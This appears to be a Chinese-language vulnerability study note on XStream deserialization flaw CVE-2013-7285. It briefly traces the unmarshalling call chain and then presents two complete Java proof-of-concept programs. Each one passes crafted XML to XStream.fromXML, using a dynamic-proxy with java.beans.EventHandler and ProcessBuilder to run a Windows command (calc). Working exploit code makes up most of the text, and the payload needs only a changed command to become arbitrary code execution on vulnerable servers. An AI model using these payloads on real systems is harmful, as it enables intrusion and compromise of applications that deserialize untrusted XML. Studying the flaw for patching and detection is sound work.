## CVE-2013-7285

`影响范围`：1.4.x<=1.4.6或1.4.10

几个关键步骤：

- TreeUnmarshaller#start开始解析xml

- HierarchicalStreams#readClassType通过标签获取Mapper中对应的Class对象
- TreeUnmarshaller#convertAnother将Class对象转换为对应的Java对象
  - mapper.defaultImplementationOf()查找Class类的实现类，根据实现类获取对应的converter
  - convert方法返回object对象
    - 调用对应converter的unmarshall方法继续解析子节点

关键点：
`dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler`。

## poc

```
package day1CVE20137285;

import com.thoughtworks.xstream.XStream;

public class Test1 {
    public static void main(String[] args) {
        XStream xStream = new XStream();
        String xml =
                "<sorted-set>\n" +
                        "    <string>foo</string>\n" +
                        "    <dynamic-proxy>\n" +
                        "        <interface>java.lang.Comparable</interface>\n" +
                        "        <handler class=\"java.beans.EventHandler\">\n" +
                        "            <target class=\"java.lang.ProcessBuilder\">\n" +
                        "                <command>\n" +
                        "                    <string>cmd</string>\n" +
                        "                    <string>/C</string>\n" +
                        "                    <string>calc</string>\n" +
                        "                </command>\n" +
                        "            </target>\n" +
                        "            <action>start</action>\n" +
                        "        </handler>\n" +
                        "    </dynamic-proxy>\n" +
                        "</sorted-set>";
        Object o = xStream.fromXML(xml);
//        System.out.println(o);

    }
}
```

```
package day1CVE20137285;

import com.thoughtworks.xstream.XStream;

public class Test2 {
    public static void main(String[] args) {
        XStream xStream = new XStream();
        String xml ="<tree-map>\n" +
                "    <entry>\n" +
                "        <dynamic-proxy>\n" +
                "            <interface>java.lang.Comparable</interface>\n" +
                "            <handler class=\"java.beans.EventHandler\">\n" +
                "                <target class=\"java.lang.ProcessBuilder\">\n" +
                "                    <command>\n" +
                "                    <string>cmd</string>\n" +
                "                    <string>/C</string>\n" +
                "                    <string>calc</string>\n" +
                "                    </command>\n" +
                "                </target>\n" +
                "                <action>start</action>\n" +
                "            </handler>\n" +
                "        </dynamic-proxy>\n" +
                "        <string>good</string>\n" +
                "    </entry>\n" +
                "</tree-map>";
        Object o = xStream.fromXML(xml);
//        System.out.println(o);

    }
}

```

